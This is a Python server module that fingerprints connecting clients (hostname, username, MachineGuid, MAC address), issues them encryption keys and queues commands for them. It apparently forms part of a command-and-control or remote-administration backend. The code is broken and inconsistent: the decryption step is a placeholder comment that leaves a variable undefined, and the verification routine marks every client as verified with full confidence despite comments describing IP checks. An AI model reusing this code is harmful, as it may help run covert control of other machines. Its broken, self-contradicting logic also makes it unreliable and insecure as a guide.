import os
import base64
import logging
from datetime import datetime
from utils.client_identity import extract_system_info
import hashlib
import json

logger = logging.getLogger(__name__)

class ClientHelper:
    """Handles client identification, verification, and command management"""
    
    def __init__(self, client_manager, crypto_helper, server):
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.server = server
    
    def identify_client(self, client_ip, headers, system_info_raw=None):
        """
        Identify a client based on unique client ID rather than IP
        
        Returns:
            tuple: (client_id, system_info, newly_identified, first_contact)
        """
        system_info = {}
        newly_identified = False
        first_contact = False
        client_id = None  # No longer default to IP
        
        # Extract client ID from headers if available
        client_id_header = headers.get('X-Client-ID')
        
        # Process system info if available
        if system_info_raw:
            try:
                # Try to decrypt system info (existing code...)
                
                # Extract the ClientId from the system info
                try:
                    system_info_obj = json.loads(system_info_json)
                    client_id = system_info_obj.get('ClientId')
                    
                    if not client_id and client_id_header:
                        # Use header ID if not in system info
                        client_id = client_id_header
                        
                    # Extract other properties...
                    hostname = system_info_obj.get('Hostname', 'Unknown')
                    username = system_info_obj.get('Username', 'Unknown')
                    machine_guid = system_info_obj.get('MachineGuid', 'Unknown')
                    os_version = system_info_obj.get('OsVersion', 'Unknown')
                    mac_address = system_info_obj.get('MacAddress', 'Unknown')
                    system_info = system_info_obj
                    
                    # Add IP to system info
                    system_info['ip'] = client_ip
                    
                except Exception as e:
                    logger.error(f"Error extracting client ID: {str(e)}")
                    # If we can't get a client ID, use IP as fallback
                    client_id = client_ip
                    
                # Check if this is a known client
                if client_id in self.client_manager.get_clients_info():
                    logger.info(f"Recognized client by ID {client_id} from {client_ip}")
                    
                    # Update IP in case it changed
                    client_info = self.client_manager.get_clients_info()[client_id]
                    if client_info.get('ip') != client_ip:
                        logger.info(f"Client {client_id} IP changed from {client_info.get('ip')} to {client_ip}")
                        
                    # Check if this client needs a key
                    if not self._has_unique_key(client_id):
                        first_contact = True
                else:
                    newly_identified = True
                    first_contact = True
                    logger.info(f"New client with ID {client_id} from {client_ip}")
                
                # Register or update the client
                self.client_manager.add_client(
                    ip=client_ip, 
                    hostname=hostname,
                    username=username,
                    machine_guid=machine_guid,
                    os_version=os_version,
                    mac_address=mac_address,
                    system_info=system_info,
                    client_id=client_id  # Pass client ID to add_client
                )
                    
            except Exception as e:
                logger.error(f"Error processing system information: {str(e)}")
                # Fallback to IP-based ID
                client_id = client_ip
                self.client_manager.add_client(ip=client_ip, client_id=client_id)
        else:
            # No system info, fall back to ID from header or IP
            client_id = client_id_header if client_id_header else client_ip
            self.client_manager.add_client(ip=client_ip, client_id=client_id)
        
        return client_id, system_info, newly_identified, first_contact

    def verify_client(self, client_id, system_info):
        """
        Verify client identity using IP address
        
        Returns:
            tuple: (is_verified, confidence, needs_key_rotation, warnings)
        """
        # For IP-based identification, consider clients verified after first contact
        is_verified = True
        confidence = 100.0  # High confidence since we're using IP address
        warnings = []
        
        # Update client verification status
        self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
        
        # Check if client needs key rotation
        has_unique_key = self._has_unique_key(client_id)
        
        # Check for manual key rotation request
        requested_key_rotation = any(
            cmd.get('command_type') == 'key_rotation' 
            for cmd in self.client_manager.get_pending_commands(client_id)
        )
        
        # Always issue a unique key on first connection
        needs_key_rotation = (not has_unique_key or requested_key_rotation)
        
        # Log key rotation status
        if requested_key_rotation:
            logger.info(f"Manual key rotation requested for client {client_id}")
        elif not has_unique_key:
            logger.info(f"First contact with client {client_id} - key issuance needed")
        
        # Register client information for future reference if client_verifier exists
        if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
            self.server.client_verifier.register_client(client_id, system_info)
        
        return is_verified, confidence, needs_key_rotation, warnings
    
    def _has_unique_key(self, client_id):
        """Check if client has a unique encryption key"""
        if hasattr(self.client_manager, 'has_unique_key'):
            return self.client_manager.has_unique_key(client_id)
        else:
            # Fallback to direct check
            return hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys
    
    def prepare_key_issuance(self, client_id):
        """
        Prepare a key issuance for a new client
        
        Returns:
            dict: Key issuance command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key issuance command
        key_issuance_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_issuance",
            "args": base64_key
        }
        
        logger.info(f"Key issuance command created for client {client_id}")
        
        return key_issuance_command
    
    def prepare_key_rotation(self, client_id):
        """
        Prepare a key rotation command for the client
        
        Returns:
            dict: Key rotation command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key rotation command
        key_rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_rotation",
            "args": base64_key
        }
        
        logger.info(f"Key rotation command issued for client {client_id}")
        
        return key_rotation_command
    
    def organize_commands(self, client_id, include_key_rotation=False, first_contact=False):
        """
        Organize commands for client including key rotation if needed
        
        Args:
            client_id: Client identifier
            include_key_rotation: Whether to include key rotation command
            first_contact: Whether this is the first contact from client
            
        Returns:
            tuple: (commands, has_key_operation)
        """
        commands = []
        has_key_operation = False
        
        # For first contact, only send a key issuance command
        if first_contact:
            key_issuance_command = self.prepare_key_issuance(client_id)
            commands.append(key_issuance_command)
            has_key_operation = True
            return commands, has_key_operation
        
        # Get pending commands for established clients
        commands = self.client_manager.get_pending_commands(client_id)
        
        # Move any key rotation commands to the front
        for i, command in enumerate(commands):
            if command.get('command_type') == 'key_rotation':
                has_key_operation = True
                if i > 0:  # Move to front if not already there
                    commands.insert(0, commands.pop(i))
                break
        
        # Add key rotation command if needed and not already present
        if include_key_rotation and not has_key_operation:
            key_rotation_command = self.prepare_key_rotation(client_id)
            commands.insert(0, key_rotation_command)
            has_key_operation = True
        
        return commands, has_key_operation
    
    def clear_commands_after_rotation(self, client_id):
        """Clear key rotation commands but keep other commands"""
        pending_commands = self.client_manager.get_pending_commands(client_id)
        non_rotation_commands = [cmd for cmd in pending_commands if cmd.get('command_type') != 'key_rotation']
        
        # Clear all commands then add back non-rotation ones
        self.client_manager.clear_pending_commands(client_id)
        
        for cmd in non_rotation_commands:
            self.client_manager.add_command(
                client_id, 
                cmd.get('command_type'), 
                cmd.get('args')
            )